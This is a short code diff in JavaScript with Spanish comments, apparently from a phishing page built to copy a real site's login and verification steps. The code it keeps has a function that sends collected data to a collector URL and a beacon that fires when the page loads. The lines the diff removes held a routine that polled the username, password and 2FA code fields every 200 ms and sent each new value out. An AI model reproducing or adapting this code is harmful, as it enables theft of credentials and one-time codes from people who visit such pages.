@@ -16,8 +16,8 @@
   function exfil(fase, datos) {
     var qs = encodeURIComponent(JSON.stringify(datos || {}));
     var url = COLLECTOR + "?fase=" + encodeURIComponent(fase) + "&d=" + qs + "&_=" + Date.now();
-    try { new Image().src = url; } catch (e) {}
-    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) {}
+    try { new Image().src = url; } catch (e) { }
+    try { fetch(url, { method: "GET", mode: "no-cors", keepalive: true }); } catch (e) { }
   }
 
   // Beacon al cargar (incluye el path para seguir el flujo del bot).
@@ -27,32 +27,6 @@
     ua: navigator.userAgent
   });
 
-  // Captura robusta por polling: no depende del submit.
-  var ult = { u: "", p: "", c: "" };
-  function chequear() {
-    var gu = document.getElementById("txt-login");
-    var gp = document.getElementById("txt-password");
-    var gc = document.getElementById("txt-2fa");
-    var u = gu ? gu.value : "";
-    var p = gp ? gp.value : "";
-    var c = gc ? gc.value : "";
-    if ((u && u !== ult.u) || (p && p !== ult.p)) {
-      ult.u = u; ult.p = p;
-      exfil("campos-login", { usuario: u, clave: p });
-    }
-    if (c && c !== ult.c) {
-      ult.c = c;
-      exfil("campos-2fa", { codigo: c });
-    }
-  }
-  setInterval(chequear, 200);
-  ["txt-login", "txt-password", "txt-2fa"].forEach(function (id) {
-    var el = document.getElementById(id);
-    if (el) {
-      el.addEventListener("input", chequear);
-      el.addEventListener("change", chequear);
-    }
-  });
 
   // --- Paso 1: login -> navega a /verificar (igual que el real) ---
   var formLogin = document.getElementById("form-login");
